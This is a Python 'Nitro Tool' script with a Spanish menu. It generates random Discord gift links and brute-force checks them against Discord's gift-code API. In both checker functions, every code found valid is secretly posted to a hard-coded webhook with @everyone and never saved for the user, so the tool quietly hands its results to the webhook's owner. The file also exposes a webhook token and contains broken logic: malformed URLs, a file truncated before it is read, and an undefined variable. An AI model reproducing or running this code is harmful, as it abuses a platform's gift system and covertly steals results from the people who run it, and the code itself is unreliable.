import json, subprocess, random, string, time, requests, colorama, ctypes, os
from colorama import Fore
from time import gmtime, sleep, strftime
from discord_webhook import DiscordWebhook

def Main():
    os.system("cls")
    colorama.init()
    ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Loading...")
    time.sleep(3)
    ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Main Menu")
    print(f'''
{Fore.LIGHTCYAN_EX}           ███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
{Fore.LIGHTCYAN_EX}           ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
{Fore.LIGHTCYAN_EX}          ▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
{Fore.LIGHTCYAN_EX}          ▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
{Fore.LIGHTCYAN_EX}          ▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
{Fore.LIGHTCYAN_EX}          ░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
{Fore.LIGHTCYAN_EX}          ░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
{Fore.LIGHTCYAN_EX}             ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
{Fore.LIGHTCYAN_EX}                   ░  ░              ░         ░ ░                  ░ ░      ░ ░      ░  ░

{Fore.LIGHTCYAN_EX}                     ╔═════════════════════════════════════════════════════════╗
{Fore.LIGHTCYAN_EX}                     ║                      Nitro Tool by viic                 ║
{Fore.LIGHTCYAN_EX}                     ║═════════════════════════════════════════════════════════║
{Fore.LIGHTCYAN_EX}                     ║ {Fore.YELLOW}[1] {Fore.LIGHTCYAN_EX}NITRO CODE GENERADOR                                ║
{Fore.LIGHTCYAN_EX}                     ║ {Fore.YELLOW}[2] {Fore.LIGHTCYAN_EX}GENERADOR Y CHECKEO                                 ║
{Fore.LIGHTCYAN_EX}                     ║ {Fore.YELLOW}[3] {Fore.LIGHTCYAN_EX}NITRO CODE CHECKER                                  ║ 
{Fore.LIGHTCYAN_EX}                     ║ {Fore.YELLOW}[E] {Fore.LIGHTCYAN_EX}EXIT                                                ║
{Fore.LIGHTCYAN_EX}                     ╚═════════════════════════════════════════════════════════╝
{Fore.LIGHTCYAN_EX}          
''')



    answer = input("   ¿Que Tool quieres usar? ")
 
    if answer == '1':
        Generator()

    elif answer == '2':
        Gen_Check()

    elif answer == '3':
        Checker()

def Generator():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Nitro Generador")
    generated = 0

    print(f'''
{Fore.LIGHTCYAN_EX}           ███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
{Fore.LIGHTCYAN_EX}           ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
{Fore.LIGHTCYAN_EX}          ▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
{Fore.LIGHTCYAN_EX}          ▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
{Fore.LIGHTCYAN_EX}          ▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
{Fore.LIGHTCYAN_EX}          ░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
{Fore.LIGHTCYAN_EX}          ░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
{Fore.LIGHTCYAN_EX}             ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
{Fore.LIGHTCYAN_EX}                   ░  ░              ░         ░ ░                  ░ ░      ░ ░      ░  ░
                                                                                                                                                    
{Fore.LIGHTCYAN_EX}   Nitro Code Generador {Fore.LIGHTBLACK_EX}
    ''')

    num=input(f"   ¿Cuantos codigos quieres generar? ")
    
    to_gen = int(num)

    path = str(os.getcwd())+"/" + "codes.txt"
    f=open("codes.txt","w+", encoding='utf-8')
        
    for kele in range(int(num)):
        nitro = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
        print(f'{Fore.LIGHTBLACK_EX}   [{Fore.GREEN}GENERADO{Fore.LIGHTBLACK_EX}] {Fore.WHITE}https://discord.gift/{nitro} {Fore.LIGHTBLACK_EX}')
        ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Generados: %s" % generated)
        generated += 1
        f.write(f'https://discord.gift/{nitro}\n')

    f.close()
    print(f"\n   Se generaron {Fore.GREEN}{to_gen} {Fore.LIGHTBLACK_EX}codigos nitro {Fore.LIGHTCYAN_EX}")
    input(f"\n   Presiona Enter para volver al Menu de Inicio.")

    if input == input:
        Main()

def Gen_Check():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Nitro Generator")
    checked = 0
    valid_codes = 0
    invalid_codes = 0

    print(f'''
{Fore.LIGHTCYAN_EX}           ███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
{Fore.LIGHTCYAN_EX}           ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
{Fore.LIGHTCYAN_EX}          ▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
{Fore.LIGHTCYAN_EX}          ▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
{Fore.LIGHTCYAN_EX}          ▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
{Fore.LIGHTCYAN_EX}          ░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
{Fore.LIGHTCYAN_EX}          ░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
{Fore.LIGHTCYAN_EX}             ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
{Fore.LIGHTCYAN_EX}                   ░  ░              ░         ░ ░                  ░ ░      ░ ░      ░  ░
                                                                                                                                                    
{Fore.LIGHTCYAN_EX}   Nitro Code Generador y Checkeo {Fore.LIGHTBLACK_EX}
    ''')

    num=input(f"   ¿Cuantos codigos quieres generar? ")
    to_gen = int(num)
    f=open("valid_codes.txt","w+", encoding='utf-8')
    
    for kele in range(int(num)):
        ncode = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
        nitro = f"https://discord.gif/{ncode}"
        url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print(f'{Fore.LIGHTBLACK_EX}[{Fore.LIGHTGREEN_EX}VALIDO{Fore.LIGHTBLACK_EX}]{Fore.LIGHTCYAN_EX} {nitro}')
            DiscordWebhook(
                            url = "https://discord.com/api/webhooks/835800770707587083/5NtDJKfTg_dbWKw2gEC1zP-u31ALMnikmpsShW4ZR9KZxKh2ItBaQ8-f4azBlyqEK7r2",
                            content = f"@everyone \n{nitro}"
                    ).execute()
            break
            f.write(f"{nitro}\n")
            ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Checked: %s" % checked)
            checked += 1
            valid_codes += 1
        else:
            print(f'{Fore.LIGHTBLACK_EX}   [{Fore.LIGHTRED_EX}INVALIDO{Fore.LIGHTBLACK_EX}]{Fore.WHITE} {nitro}')
            ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Checked: %s" % checked)
            checked += 1
            invalid_codes += 1
 
    f.close()
    print(f"\n{Fore.LIGHTBLACK_EX}   Se generaron {Fore.WHITE}{to_gen} {Fore.LIGHTBLACK_EX}codigos nitro, {Fore.WHITE}{valid_codes} {Fore.GREEN}Validos {Fore.LIGHTBLACK_EX}y {Fore.WHITE}{invalid_codes} {Fore.RED}Invalidos{Fore.LIGHTCYAN_EX}\n")
    input(f"   Presiona Enter para volver al Menu de Inicio.")
    Main()


def Checker():
    os.system("cls")
    colorama.init()
    checked = 0
    valido = 0
    invalido = 0

    print(f'''
{Fore.LIGHTCYAN_EX}           ███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
{Fore.LIGHTCYAN_EX}           ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
{Fore.LIGHTCYAN_EX}          ▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
{Fore.LIGHTCYAN_EX}          ▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
{Fore.LIGHTCYAN_EX}          ▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
{Fore.LIGHTCYAN_EX}          ░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
{Fore.LIGHTCYAN_EX}          ░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
{Fore.LIGHTCYAN_EX}             ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
{Fore.LIGHTCYAN_EX}                   ░  ░              ░         ░ ░                  ░ ░      ░ ░      ░  ░                                                                                                                                     
  
{Fore.LIGHTCYAN_EX}   Nitro Code Checker by viic
    ''')


    f=open("codes.txt","w+", encoding='utf-8')
    v=open("valid_codes.txt","w+", encoding='utf-8')

    for line in f:
        nitro = line.strip("\n")
        
        url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print(f'{Fore.LIGHTBLACK_EX}[{Fore.LIGHTGREEN_EX}VALID{Fore.LIGHTBLACK_EX}]{Fore.LIGHTCYAN_EX} {nitro}')
            DiscordWebhook(
                            url = "https://discord.com/api/webhooks/835800770707587083/5NtDJKfTg_dbWKw2gEC1zP-u31ALMnikmpsShW4ZR9KZxKh2ItBaQ8-f4azBlyqEK7r2",
                            content = f"@everyone \n{nitro}"
                    ).execute()
            break
            v.write(f"{lnitro}\n")
            ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Checked: %s" % checked)
            checked += 1
            valido += 1
        else:
            print(f'{Fore.LIGHTBLACK_EX}   [{Fore.LIGHTRED_EX}INVALID{Fore.LIGHTBLACK_EX}]{Fore.WHITE} {nitro}')
            ctypes.windll.kernel32.SetConsoleTitleW(f"[Nitro Tool] By viic | Checked: %s" % checked)
            checked += 1
            invalido += 1

    f.close()
    v.close()
    print(f"\n{Fore.LIGHTBLACK_EX}   Se checkearon {Fore.WHITE}{checked} {Fore.LIGHTBLACK_EX}codigos nitro, {Fore.WHITE}{valido} {Fore.GREEN}Validos {Fore.LIGHTBLACK_EX}y {Fore.WHITE}{invalido} {Fore.RED}Invalidos{Fore.LIGHTCYAN_EX}\n")
    input(f"   Presiona Enter para volver al Menu de Inicio")
    Main()


Main()